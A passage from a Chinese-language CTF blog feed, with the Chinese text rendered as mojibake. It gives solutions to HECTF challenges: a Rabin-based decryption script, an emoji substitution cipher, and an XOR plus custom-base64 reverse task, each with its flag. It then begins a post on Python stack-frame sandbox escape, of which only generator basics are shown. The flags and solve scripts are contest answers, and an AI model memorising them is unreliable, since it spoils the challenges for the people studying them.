class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> x2 <span class="keyword">in</span> candidates_2:</span><br><span class="line">        res = rabin_sqrt(x2, p, q, n)</span><br><span class="line">        candidates_3.update(res)</span><br><span class="line">    candidates_3 = <span class="built_in">list</span>(candidates_3)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;ç¬¬3æ¬¡å¼€æ–¹ï¼ˆå¾—åˆ°mçš„å€™é€‰è§£ï¼‰ï¼šå…±<span class="subst">&#123;<span class="built_in">len</span>(candidates_3)&#125;</span>ä¸ª&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># éªŒè¯å€™é€‰è§£ï¼šç¡®ä¿m^8 â‰¡ c mod nï¼ˆè¿‡æ»¤æ— æ•ˆè§£ï¼‰</span></span><br><span class="line">    valid_m = []</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> candidates_3:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">pow</span>(m, e, n) == c:</span><br><span class="line">            valid_m.append(m)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> valid_m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter_flag</span>(<span class="params">valid_m</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;ç­›é€‰æœ‰æ•ˆflagï¼ˆå¯æ‰“å°å­—ç¬¦ã€å«flagæ ¼å¼ï¼‰&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n========== å¼€å§‹ç­›é€‰æœ‰æ•ˆflag ==========&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> idx, m <span class="keyword">in</span> <span class="built_in">enumerate</span>(valid_m):</span><br><span class="line">        <span class="comment"># ä¸¤ç§å­—èŠ‚è½¬æ¢æ–¹å¼ï¼ˆå…¼å®¹ä¸åŒåº“ï¼‰</span></span><br><span class="line">        bytes1 = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line">        bytes2 = libnum.n2s(<span class="built_in">int</span>(m))</span><br><span class="line">        <span class="comment"># å°è¯•è§£ç ä¸ºå¯æ‰“å°å­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            text1 = bytes1.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">            text2 = bytes2.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            text1 = <span class="string">&quot;æ— æ³•è§£ç &quot;</span></span><br><span class="line">            text2 = <span class="string">&quot;æ— æ³•è§£ç &quot;</span></span><br><span class="line">        <span class="comment"># æ‰“å°å€™é€‰ç»“æœ</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\nå€™é€‰è§£<span class="subst">&#123;idx+<span class="number">1</span>&#125;</span>ï¼š&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;æ˜æ–‡mï¼š<span class="subst">&#123;m&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;long_to_bytesç»“æœï¼š<span class="subst">&#123;bytes1&#125;</span> | è§£ç åï¼š<span class="subst">&#123;text1&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;libnum.n2sç»“æœï¼š<span class="subst">&#123;bytes2&#125;</span> | è§£ç åï¼š<span class="subst">&#123;text2&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># ç­›é€‰å«flagæ ‡è¯†çš„æœ‰æ•ˆç»“æœ</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> text1 <span class="keyword">or</span> <span class="string">&quot;FLAG&quot;</span> <span class="keyword">in</span> text1 <span class="keyword">or</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> text2 <span class="keyword">or</span> <span class="string">&quot;FLAG&quot;</span> <span class="keyword">in</span> text2:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;â˜… æ‰¾åˆ°æœ‰æ•ˆflagï¼š<span class="subst">&#123;text1 <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> text1 <span class="keyword">else</span> text2&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> m, text1 <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> text1 <span class="keyword">else</span> text2</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\næœªè‡ªåŠ¨ç­›é€‰åˆ°flagï¼Œè¯·æ‰‹åŠ¨æŸ¥çœ‹å€™é€‰è§£ä¸­çš„å¯æ‰“å°å­—ç¬¦ä¸²&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 1. è¿ç»­3æ¬¡Rabinå¼€æ–¹ï¼Œæ±‚è§£æ‰€æœ‰æœ‰æ•ˆæ˜æ–‡å€™é€‰</span></span><br><span class="line">    valid_m_list = solve_e8_with_rabin(c, p, q, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\néªŒè¯åæœ‰æ•ˆæ˜æ–‡å€™é€‰æ•°ï¼š<span class="subst">&#123;<span class="built_in">len</span>(valid_m_list)&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. ç­›é€‰å¹¶è¾“å‡ºflag</span></span><br><span class="line">    final_m, final_flag = filter_flag(valid_m_list)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. æœ€ç»ˆç»“æœæ±‡æ€»</span></span><br><span class="line">    <span class="keyword">if</span> final_flag:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n========== è§£å¯†å®Œæˆ ==========&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;æœ€ç»ˆæ˜æ–‡mï¼š<span class="subst">&#123;final_m&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;æœ€ç»ˆflagï¼š<span class="subst">&#123;final_flag&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n========== è§£å¯†ç»“æŸï¼šæœªæ‰¾åˆ°æ˜ç¡®flagï¼Œè¯·æ‰‹åŠ¨æ ¸å¯¹å€™é€‰è§£ ==========&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="comment">#æœ€ç»ˆflagï¼šHECTF&#123;this_is_a_flag_emm_is_a_true_flag_ok_all_right&#125;</span></span><br></pre></td></tr></table></figure><h1 id="misc"><a class="markdownIt-Anchor" href="#misc">#</a> MISC</h1><h2 id="ç­¾åˆ°"><a class="markdownIt-Anchor" href="#ç­¾åˆ°">#</a> <strong>ç­¾åˆ°</strong></h2><blockquote><p>å…³æ³¨å‡Œæ­¦ç§‘æŠ€å¾®ä¿¡å…¬ä¼—å·ï¼Œå…³æ³¨å…¬ä¼—å·åå‘é€ â€œ2025HECTFï¼Œå¯åŠ¨ï¼ï¼ï¼â€ï¼Œè·å¾—å°æƒŠå–œï¼ï¼ï¼</p></blockquote><p>â€‹åšæ³•å°±æ˜¯é¢˜ç›®æè¿°å­—é¢æ„æ€ã€‚</p><h2 id="check_in"><a class="markdownIt-Anchor" href="#check_in">#</a> <strong>Check_In</strong></h2><blockquote><p>ğŸµ ğŸ‘ğŸ²âš½ğŸ‰ ğŸšƒ</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctf i love u -&gt; ğŸ¹ğŸ€ğŸŒº ğŸµ ğŸ‘ğŸ²âš½ğŸ‰ ğŸšƒ</span><br><span class="line">$flag -&gt; ğŸŒ¹ğŸ‰ğŸ¹ğŸ€ğŸŒº&#123;ğŸš‡ğŸ‰ğŸ‘ğŸ¹ğŸ²âš¾ğŸ‰_ğŸ€ğŸ²_ğŸŒ¹ğŸ‰ğŸ¹ğŸ€ğŸŒº_ğŸŒ¹ğŸ²ğŸ‰ğŸ‰_ğŸ’ğŸ²ğŸšƒ_ğŸ¹ğŸ“ğŸŒ¾_ğŸ‰ğŸŒ¾ğŸ‡ğŸ²ğŸ’_ğŸµğŸ€&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™å‡ ä¸ªæ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œhectf å°±æ˜¯ğŸŒ¹ğŸ‰ğŸ¹ğŸ€ğŸŒºï¼Œå¯ä»¥å¾—åˆ°ä¸€ä¸€å¯¹åº”çš„å…³ç³»ï¼Œä¹‹åå¾—åˆ°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hectf&#123;ğŸš‡elcoâš¾e_to_hectf_hoğŸ‰e_ğŸ’ou_cğŸ“ğŸŒ¾_eğŸŒ¾ğŸ‡oğŸ’_it&#125;</span><br></pre></td></tr></table></figure><p>â€‹çœ‹èµ·æ¥è¿™ä¸ª flag æ˜¯å¯è¯»çš„ï¼Œæ‰¾ ai çœ‹ç€æ¥æ¥å›å›è„‘æ´æ¨æµ‹å¯èƒ½æ˜¯ welcome to hectf hope you can enjoy itï¼Œæœ€åçš„ flagï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HECTF&#123;welcome<span class="built_in">_</span>to<span class="built_in">_</span>hectf<span class="built_in">_</span>hope<span class="built_in">_</span>you<span class="built_in">_</span>can<span class="built_in">_</span>enjoy<span class="built_in">_</span>it&#125;</span><br></pre></td></tr></table></figure><h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse">#</a> Reverse</h1><h2 id="easyree"><a class="markdownIt-Anchor" href="#easyree">#</a> <strong>easyree</strong></h2><p>â€‹åç¼–è¯‘ä¹‹åï¼Œä¸‰ä¸ªå‡½æ•°ï¼Œå…ˆçœ‹ç¬¬ä¸€ä¸ªï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_1389</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  std::string::<span class="built_in">basic_string</span>();</span><br><span class="line">  std::string::<span class="built_in">reserve</span>(a1, <span class="number">64LL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">63</span>; ++i )</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(a1, (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="type">char</span>)(byte_2040[i] ^ <span class="number">0x55</span>));</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ä¸€ä¸ªå¼‚æˆ–ï¼Œæå–æ•°æ®ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> ida_chars[] =</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="number">15</span>,  <span class="number">12</span>,  <span class="number">13</span>,   <span class="number">2</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">6</span>,   <span class="number">7</span>,   <span class="number">4</span>,</span><br><span class="line">        <span class="number">5</span>,  <span class="number">26</span>,  <span class="number">27</span>,  <span class="number">24</span>,  <span class="number">25</span>,  <span class="number">30</span>,  <span class="number">31</span>,  <span class="number">28</span>,  <span class="number">29</span>,  <span class="number">18</span>,</span><br><span class="line">       <span class="number">19</span>,  <span class="number">16</span>,  <span class="number">17</span>,  <span class="number">22</span>,  <span class="number">23</span>,  <span class="number">20</span>,  <span class="number">47</span>,  <span class="number">44</span>,  <span class="number">45</span>,  <span class="number">34</span>,</span><br><span class="line">       <span class="number">35</span>,  <span class="number">32</span>,  <span class="number">33</span>,  <span class="number">38</span>,  <span class="number">39</span>,  <span class="number">36</span>,  <span class="number">37</span>,  <span class="number">58</span>,  <span class="number">59</span>,  <span class="number">56</span>,</span><br><span class="line">       <span class="number">57</span>,  <span class="number">62</span>,  <span class="number">63</span>,  <span class="number">60</span>,  <span class="number">61</span>,  <span class="number">50</span>,  <span class="number">51</span>,  <span class="number">48</span>,  <span class="number">49</span>,  <span class="number">54</span>,</span><br><span class="line">       <span class="number">55</span>,  <span class="number">52</span>, <span class="number">108</span>, <span class="number">109</span>,  <span class="number">98</span>,  <span class="number">99</span>,  <span class="number">96</span>,  <span class="number">97</span>, <span class="number">102</span>, <span class="number">103</span>,</span><br><span class="line">      <span class="number">100</span>, <span class="number">101</span>, <span class="number">126</span>, <span class="number">122</span></span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure><p>â€‹ç¬¬äºŒä¸ªå‡½æ•°ï¼Œä¹Ÿæ˜¯å¼‚æˆ–ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_143F</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  std::string::<span class="built_in">basic_string</span>();</span><br><span class="line">  std::string::<span class="built_in">reserve</span>();</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">48</span>; ++i )</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(a1, (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="type">char</span>)(byte_2080[i] ^ <span class="number">0x33</span>));</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹æå–æ•°æ®ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> ida_chars2[] =</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="number">123</span>, <span class="number">101</span>, <span class="number">118</span>, <span class="number">100</span>, <span class="number">118</span>, <span class="number">101</span>, <span class="number">114</span>,   <span class="number">1</span>,  <span class="number">68</span>,   <span class="number">4</span>,</span><br><span class="line">                <span class="number">118</span>,  <span class="number">91</span>, <span class="number">113</span>,  <span class="number">82</span>, <span class="number">106</span>,  <span class="number">84</span>, <span class="number">125</span>,  <span class="number">11</span>,   <span class="number">3</span>,  <span class="number">10</span>,</span><br><span class="line">                <span class="number">125</span>, <span class="number">102</span>,   <span class="number">3</span>,  <span class="number">81</span>, <span class="number">114</span>, <span class="number">112</span>, <span class="number">113</span>,  <span class="number">82</span>,  <span class="number">75</span>,  <span class="number">66</span>,</span><br><span class="line">                <span class="number">126</span>,  <span class="number">92</span>, <span class="number">112</span>,   <span class="number">5</span>,  <span class="number">75</span>,  <span class="number">87</span>,  <span class="number">75</span>,  <span class="number">66</span>, <span class="number">102</span>,  <span class="number">67</span>,</span><br><span class="line">                <span class="number">112</span>,   <span class="number">5</span>,  <span class="number">71</span>,  <span class="number">80</span>,  <span class="number">69</span>, <span class="number">100</span>, <span class="number">102</span>,   <span class="number">3</span></span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><p>â€‹è§£å¯†è„šæœ¬ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> ida_chars[] =</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="number">15</span>,  <span class="number">12</span>,  <span class="number">13</span>,   <span class="number">2</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">6</span>,   <span class="number">7</span>,   <span class="number">4</span>,</span><br><span class="line">            <span class="number">5</span>,  <span class="number">26</span>,  <span class="number">27</span>,  <span class="number">24</span>,  <span class="number">25</span>,  <span class="number">30</span>,  <span class="number">31</span>,  <span class="number">28</span>,  <span class="number">29</span>,  <span class="number">18</span>,</span><br><span class="line">           <span class="number">19</span>,  <span class="number">16</span>,  <span class="number">17</span>,  <span class="number">22</span>,  <span class="number">23</span>,  <span class="number">20</span>,  <span class="number">47</span>,  <span class="number">44</span>,  <span class="number">45</span>,  <span class="number">34</span>,</span><br><span class="line">           <span class="number">35</span>,  <span class="number">32</span>,  <span class="number">33</span>,  <span class="number">38</span>,  <span class="number">39</span>,  <span class="number">36</span>,  <span class="number">37</span>,  <span class="number">58</span>,  <span class="number">59</span>,  <span class="number">56</span>,</span><br><span class="line">           <span class="number">57</span>,  <span class="number">62</span>,  <span class="number">63</span>,  <span class="number">60</span>,  <span class="number">61</span>,  <span class="number">50</span>,  <span class="number">51</span>,  <span class="number">48</span>,  <span class="number">49</span>,  <span class="number">54</span>,</span><br><span class="line">           <span class="number">55</span>,  <span class="number">52</span>, <span class="number">108</span>, <span class="number">109</span>,  <span class="number">98</span>,  <span class="number">99</span>,  <span class="number">96</span>,  <span class="number">97</span>, <span class="number">102</span>, <span class="number">103</span>,</span><br><span class="line">          <span class="number">100</span>, <span class="number">101</span>, <span class="number">126</span>, <span class="number">122</span></span><br><span class="line">        &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp[<span class="number">64</span>] =&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;base64è¡¨å¼‚æˆ–åï¼š&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">63</span>; i++)&#123;</span><br><span class="line">        temp[i] = ida_chars[i] ^ <span class="number">0x55</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,temp[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> ida_chars2[] =</span><br><span class="line">            &#123;</span><br><span class="line">                    <span class="number">123</span>, <span class="number">101</span>, <span class="number">118</span>, <span class="number">100</span>, <span class="number">118</span>, <span class="number">101</span>, <span class="number">114</span>,   <span class="number">1</span>,  <span class="number">68</span>,   <span class="number">4</span>,</span><br><span class="line">                    <span class="number">118</span>,  <span class="number">91</span>, <span class="number">113</span>,  <span class="number">82</span>, <span class="number">106</span>,  <span class="number">84</span>, <span class="number">125</span>,  <span class="number">11</span>,   <span class="number">3</span>,  <span class="number">10</span>,</span><br><span class="line">                    <span class="number">125</span>, <span class="number">102</span>,   <span class="number">3</span>,  <span class="number">81</span>, <span class="number">114</span>, <span class="number">112</span>, <span class="number">113</span>,  <span class="number">82</span>,  <span class="number">75</span>,  <span class="number">66</span>,</span><br><span class="line">                    <span class="number">126</span>,  <span class="number">92</span>, <span class="number">112</span>,   <span class="number">5</span>,  <span class="number">75</span>,  <span class="number">87</span>,  <span class="number">75</span>,  <span class="number">66</span>, <span class="number">102</span>,  <span class="number">67</span>,</span><br><span class="line">                    <span class="number">112</span>,   <span class="number">5</span>,  <span class="number">71</span>,  <span class="number">80</span>,  <span class="number">69</span>, <span class="number">100</span>, <span class="number">102</span>,   <span class="number">3</span></span><br><span class="line">            &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp2[<span class="number">64</span>] =&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;å¯†æ–‡å¼‚æˆ–åï¼š&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i++)&#123;</span><br><span class="line">        temp2[i] = ida_chars2[i] ^ <span class="number">0x33</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,temp2[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¾“å‡ºç»“æœï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base64è¡¨å¼‚æˆ–åï¼šZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba9876543210+/</span><br><span class="line">å¯†æ–‡å¼‚æˆ–åï¼šHVEWEVA2w7EhBaYgN809NU0bACBaxqMoC6xdxqUpC6tcvWU0</span><br></pre></td></tr></table></figure><p>â€‹æ ¹æ®è¾“å‡ºç»“æœçœ‹å‡ºæ¥æ˜¯ base64 å˜è¡¨ï¼Œè§£ç å¾—åˆ° flagï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HECTF&#123;welc0m3<span class="built_in">_</span>t0<span class="built_in">_</span>rev3r3e<span class="built_in">_</span>w0r1d<span class="built_in">_</span>x1x1&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTFerçš„æ¯”èµ›ä¹‹è·¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Game </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pythonæ ˆå¸§é€ƒé€¸</title>
      <link href="/posts/2d792864.html"/>
      <url>/posts/2d792864.html</url>
      
        <content type="html"><![CDATA[<h1 id="pythonæ ˆå¸§é€ƒé€¸"><a class="markdownIt-Anchor" href="#pythonæ ˆå¸§é€ƒé€¸">#</a> Python æ ˆå¸§é€ƒé€¸ï¼š</h1><h2 id="1-yield-è¯­ä¸ç”Ÿæˆå™¨å‡½æ•°"><a class="markdownIt-Anchor" href="#1-yield-è¯­ä¸ç”Ÿæˆå™¨å‡½æ•°">#</a> 1ã€yield è¯­ä¸ç”Ÿæˆå™¨å‡½æ•°ï¼š</h2><p>â€‹python ä¸­çš„ yield è¯­å¥ç”¨äºå®šä¹‰ç”Ÿæˆå™¨å‡½æ•°ï¼Œå®ƒèƒ½è®©å‡½æ•°åœ¨è¿è¡Œè¿‡ç¨‹ä¸­æš‚åœå¹¶ä¿å­˜å½“å‰çŠ¶æ€ï¼Œåç»­å†æ¢å¤æ‰§è¡Œã€‚</p><p>â€‹ç”Ÿæˆå™¨ æ˜¯  Pythonn ä¸­ä¸€ç§ç‰¹æ®Šçš„è¿­ä»£å™¨ï¼Œå®ƒå¯ä»¥åœ¨è¿­ä»£è¿‡ç¨‹ä¸­åŠ¨æ€ç”Ÿæˆå€¼ï¼Œè€Œä¸éœ€è¦ä¸€æ¬¡æ€§å°†æ‰€æœ‰å€¼å­˜ 0 å‚¨åœ¨å†…å­˜ä¸­ã€‚</p><p>â€‹ä¸¾ä¸ªç”Ÿæˆå™¨çš„ä¾‹å­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ç”Ÿæˆå™¨å‡½æ•°ç¬¬ä¸€æ¬¡æ‰§è¡Œ&quot;</span>)</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ç”Ÿæˆå™¨å‡½æ•°ç¬¬äºŒæ¬¡æ‰§è¡Œ&quot;</span>)</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ç”Ÿæˆå™¨å‡½æ•°ç¬¬ä¸‰æ¬¡æ‰§è¡Œ&quot;</span>)</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gen = func()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))</span><br><span class="line"><span class="comment"># frame = [x for x in gen]</span></span><br><span class="line"><span class="comment"># print(frame)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ‰§è¡Œç»“æœ</span></span><br><span class="line"><span class="comment">#ç”Ÿæˆå™¨å‡½æ•°ç¬¬ä¸€æ¬¡æ‰§è¡Œ</span></span><br><span class="line"><span class="comment">#1</span></span><br><span class="line"><span class="comment">#ç”Ÿæˆå™¨å‡½æ•°ç¬¬äºŒæ¬¡æ‰§è¡Œ</span></span><br><span class="line"><span class="comment">#2</span></span><br><span class="line"><span class="comment">#ç”Ÿæˆå™¨å‡½æ•°ç¬¬ä¸‰æ¬¡æ‰§è¡Œ</span></span><br><span class="line"><span class="comment">#3</span></span><br></pre></td></tr></table></figure><p>â€‹æˆ–è€…ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    a = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">yield</span> a</span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">f = f()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(f))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(f))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ‰§è¡Œç»“æœ</span></span><br><span class="line"><span class="comment">#1</span></span><br><span class="line"><span class="comment">#2</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹Ÿå¯ä»¥ éå†è·å–æ‰€æœ‰çš„è‡ªå¢å€¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 